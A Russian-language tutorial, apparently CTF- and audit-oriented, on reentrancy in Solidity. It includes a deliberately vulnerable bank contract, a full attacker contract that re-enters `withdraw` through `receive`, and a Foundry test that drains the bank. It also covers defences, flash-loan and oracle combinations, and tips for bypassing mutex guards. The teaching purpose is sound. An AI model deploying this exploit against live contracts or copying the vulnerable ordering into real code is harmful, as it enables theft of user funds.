## Вопрос, с которого всё начинается

В задаче по DeFi сказано: «опустоши банк». Ты вносишь 1 wei, выводишь — и банк отдаёт весь свой баланс. Звучит как магия, но за этим стоит **reentrancy** (повторный вход) — исторически самая дорогая уязвимость смарт-контрактов, именно она обрушила The DAO в 2016 году. В этом уроке мы напишем атакующий контракт целиком и разберём, почему это работает.

## Наш пример: банк, который отдаёт больше, чем должен

Дано:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");

        // 1) внешний вызов ДО обновления состояния — фатально
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "send failed");

        // 2) обновление состояния происходит уже позже
        balances[msg.sender] = 0;
    }
}
```

Смотрим на порядок строк в `withdraw`: сначала банк **отправляет** эфир (`msg.sender.call{value: bal}`), и только потом обнуляет `balances[msg.sender]`. Пока идёт отправка, управление уходит наружу — а состояние ещё не обнулено. Это и есть корень уязвимости.

## Атакующий контракт

Пишем контракт, который при получении эфира снова вызывает `withdraw`:

```solidity
interface IVuln {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVuln public bank;
    uint256 public count;

    constructor(address _bank) { bank = IVuln(_bank); }

    // получаем эфир от банка и снова вызываем withdraw()
    receive() external payable {
        if (count < 5) {
            count++;
            bank.withdraw();
        }
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
}
```

`receive` — специальная функция, которая срабатывает, когда контракт получает эфир. Атака: `attack()` кладёт 1 wei и вызывает `withdraw()`. Банк отправляет эфир → срабатывает наш `receive` → он снова зовёт `withdraw()` → банк снова отправляет (баланс ещё не обнулён!) → цикл повторяется. Каждый повторный вход выводит **исходную** сумму `bal`, пока в банке есть эфир.

## Прогоняем в Foundry

Оформляем тест:

```solidity
function testReentrancy() public {
    VulnerableBank bank = new VulnerableBank();
    vm.deal(address(this), 10 ether);
    bank.deposit{value: 5 ether}();      // чужие деньги в банке

    Attacker atk = new Attacker(address(bank));
    atk.attack{value: 1 ether}();        // наша атака

    assertEq(address(bank).balance, 0);  // банк пуст
}
```

```bash
$ forge test -vvvv --match-test testReentrancy
[PASS] testReentrancy()
```

`-vvvv` покажет вложенные `withdraw` и `receive` — видно, как рекурсия вытягивает деньги. Так работает цикл аудита: сначала эксплойт, потом фикс, потом повторный прогон, который должен упасть.

## Разновидности reentrancy

| Вид | Описание |
|-----|----------|
| Single-function | Повторный вход в ту же функцию (наш случай) |
| Cross-function | Вход в другую функцию, которая ещё верит старому состоянию |
| Cross-contract | Вход через другой контракт протокола |
| Read-only | Чтение несогласованного состояния во время вызова |

**Cross-function** коварен тем, что `nonReentrant` на одной функции не спасает: атакующий заходит в *другую* функцию, которая читает ещё не обновлённое состояние. **Read-only reentrancy** — когда view-функция отдаёт несогласованную цену другим протоколам прямо во время callback.

## Защита: checks-effects-interactions

Правильный порядок — сначала **проверки** (checks), потом **изменения состояния** (effects), и только затем **внешние вызовы** (interactions):

```solidity
function withdraw() external {
    uint256 bal = balances[msg.sender];
    require(bal > 0);
    balances[msg.sender] = 0;              // effect ДО interaction
    (bool ok, ) = msg.sender.call{value: bal}("");
    require(ok);
}
```

Теперь на повторном входе `bal == 0`, и атака ломается. Дополнительно ставят **reentrancy guard** — мьютекс-флаг, который запрещает повторный вход во время выполнения:

```solidity
uint256 private locked = 1;
modifier nonReentrant() {
    require(locked == 1, "reentrant");
    locked = 2;
    _;
    locked = 1;
}
```

OpenZeppelin `ReentrancyGuard` делает ровно это. Ещё одно правило — **pull-over-push**: пусть получатель сам забирает средства, а не контракт ему отправляет.

## Flash loan и оракулы: комбо

Reentrancy часто комбинируют с **flash loan** — мгновенным займом без залога, который берут и возвращают в одной транзакции. Схема: взять огромный займ → сдвинуть цену пула с низкой ликвидностью → эксплуатировать протокол, который доверяет этой цене → вернуть займ и забрать профит. Оракул на `getReserves()` (spot-цена) уязвим; `Chainlink` и TWAP (усреднённая по времени цена) устойчивее, потому что их нельзя сдвинуть одной транзакцией. Важно, что весь цикл должен уложиться в **одну транзакцию**: только тогда заём «мгновенный», а атака атомарна.

## Если не сработало

Если PoC «не реентрит» — проверь три вещи. Первое: `receive` действительно вызывается? Логируй `count`. Второе: хватает ли газа — `transfer`/`send` передают только 2300 газа и не дадут повторно вызвать `withdraw`, поэтому в PoC используется `call`. Третье: состояние обновляется не до вызова? Если банк уже обнуляет баланс до `call` — он не уязвим. Если транзакция падает с «send failed» — у контракта нет `receive` или не хватает баланса. И помни: слишком глубокий рекурсивный стек упрётся в лимит газа.

## Газ, call и transfer

Разберём, почему атака вообще возможна, на уровне газа. Внешний перевод эфира бывает трёх видов: `transfer` и `send` передают получателю только **2300 газа** — этого хватает на событие, но **не** на повторный вызов `withdraw`, поэтому исторически их использовали как «защиту» от reentrancy. Однако 2300 газа ломает совместимость с контрактами, у которых дорогой `receive`, и после EIP-1884 лимит стал недостаточен для части случаев. `call{value: ...}("")` передаёт **весь оставшийся газ** — именно он и открывает reentrancy. Вывод: правильная защита — не лимит газа, а порядок операций (checks-effects-interactions) плюс guard. Ещё один паттерн — **pull-over-push**: пусть получатель сам забирает средства, а не контракт ему отправляет.

## Тонкости эксплуатации

Reentrancy зависит от порядка операций в контракте. Разберём, что мешает и как проверить гипотезу.

**Атака не проходит в Foundry.** Проверь версию Solidity и настройки компилятора (`pragma`), совпадение с целевым контрактом. Reentrancy требует, чтобы `call` передавал управление атакующему — если используется `transfer`/`send` с лимитом газа 2300, вложенный вызов не поместится.

**Контракт обновлён — `call` заменён на `transfer`.** Тогда классическая reentrancy невозможна, но остаются **read-only reentrancy**: внешний вызов не меняет состояние, но другие контракты читают устаревшее значение. Также проверь **cross-function** и **cross-contract** варианты.

**Защита в виде мьютекса (nonReentrant).** Если есть модификатор блокировки — прямой reentry не сработает. Ищи другой путь: гонку через несколько контрактов, или уязвимость в *другой* функции, не защищённой мьютексом.

**`call` возвращает false, но атака не идёт.** Проверь, не игнорируется ли результат `call`. Если контракт не проверяет возврат — атака может требовать, чтобы вызов *успешно* прошёл. Убедись, что твой fallback-контракт готов принять вызов.

**Flash loan недоступен.** В CTF часто есть локальный «банк» с большим балансом — используй его вместо внешнего flash loan. Или найди, что можно занять у самого контракта.

**Газ кончается.** Reentrancy требует, чтобы хватило газа на вложенный вызов. Увеличь лимит, оптимизируй атакующий контракт, избегай дорогих операций в цикле.

## Частые вопросы

**Что такое reentrancy простыми словами?** Контракт вызывает внешний код *до* того, как обновил своё состояние. Внешний код вызывает контракт снова — и тот, видя старое состояние, повторяет действие (например, выдаёт деньги дважды).

**Почему `transfer` защищает, а `call` — нет?** `transfer`/`send` дают всего 2300 газа — недостаточно для вложенного вызова. `call` передаёт весь доступный газ и позволяет reentry.

**Как защититься?** Паттерн checks-effects-interactions (сначала проверь, потом обнови состояние, только потом внешний вызов), мьютексы (`nonReentrant`), и осторожность с внешними вызовами.

**Что такое read-only reentrancy?** Внешний контракт читает состояние другого во время его незавершённого вызова — и видит устаревшее значение. Даже без изменения состояния это эксплуатируется.

## Как проверять гипотезу

Собери сценарий целиком в Foundry: разверни целевой контракт, разверни атакующий, вызови уязвимую функцию и посмотри, изменился ли баланс. Если состояние обновляется *после* внешнего вызова — reentrancy возможна. Проверь все внешние вызовы: `call`, `transfer` токенов, хуки (ERC-777, ERC-1155) — они тоже передают управление.

Различай варианты: single-function (классика), cross-function (вызов другой функции), cross-contract (через другой контракт) и read-only (чтение чужого состояния). Для каждого — свой сценарий. И помни про защиту: checks-effects-interactions и мьютексы. Если они есть, ищи, нет ли функции *без* мьютекса или обхода через токен-хук. Всегда проверяй, что атака экономически осмысленна: прибыль должна превышать газ.

## Что мы теперь знаем

- Корень reentrancy — внешний вызов **до** обновления состояния.
- Атакующий использует `receive`, который снова зовёт уязвимую функцию.
- Безопасный порядок — **checks-effects-interactions**; сверху — `nonReentrant`.
- `nonReentrant` на одной функции не спасает от cross-function входа.
- Flash loan + spot-оракул — типовое комбо для DeFi-атак.
- `call` (весь газ) открывает reentrancy, `transfer` (2300 газа) — нет, но ломает совместимость.
